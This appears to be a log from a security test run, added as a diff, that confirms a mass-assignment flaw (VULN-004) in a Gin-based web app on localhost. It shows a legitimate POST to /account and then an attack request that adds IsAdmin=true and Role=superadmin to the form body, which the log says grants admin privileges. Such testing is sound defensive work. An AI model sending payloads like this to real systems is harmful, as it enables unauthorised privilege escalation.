@@ -1,0 +1,12 @@
+==============================================================================
+VULN-004: reflection binder maps all exported fields -> mass assignment
+target: http://localhost:36275
+[INFO] exercising gin code path: binding/form_mapping.go:149-154 (untagged field ⇒ bind by field.Name, no allowlist)
+==============================================================================
+[STEP] legit: POST /account  body: email=user@example.com  (the only intended input)
+[INFO] legit -> {'IsAdmin': False, 'Role': '', 'email': 'user@example.com'}
+[STEP] attack: POST /account  body: email=...&IsAdmin=true&Role=superadmin
+[INFO] attack -> {'IsAdmin': True, 'Role': 'superadmin', 'email': 'attacker@example.com'}
+[PROOF] untagged privileged fields bound from attacker input: IsAdmin=true, Role='superadmin' (false/'' when not supplied) — no field allowlist
+[OK] exploit confirmed — mass assignment: gin binds every exported field by name
+==> VULN-004: CONFIRMED — IsAdmin/Role (untagged) mass-assigned from request body -> privilege escalation
